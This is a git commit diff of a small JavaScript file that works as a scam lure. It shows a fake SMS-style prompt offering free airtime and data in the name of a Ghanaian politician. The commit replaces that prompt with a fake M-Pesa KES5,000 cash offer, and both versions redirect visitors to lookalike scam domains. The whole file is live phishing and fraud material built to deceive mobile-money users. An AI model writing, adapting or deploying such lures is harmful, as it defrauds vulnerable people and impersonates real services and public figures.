ce0980b82ccd9816c77f3b836c4832acc6b83fd5
essac5 <154714847+essac5@users.noreply.github.com>
2024-09-28 02:32:39 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'WITHDRAW KES5,000'
+password=prompt('SMS: Congratulations You are among the M-Pesa Customers to receive KES5,000 Offer, Kindly Press OK to withdraw cash now ','WITHDRAW KES5,000');
+if (password != 'WITHDRAW KES5,000') {
+location.href='https://m-pesa.programs.lat/Gifts';
 }
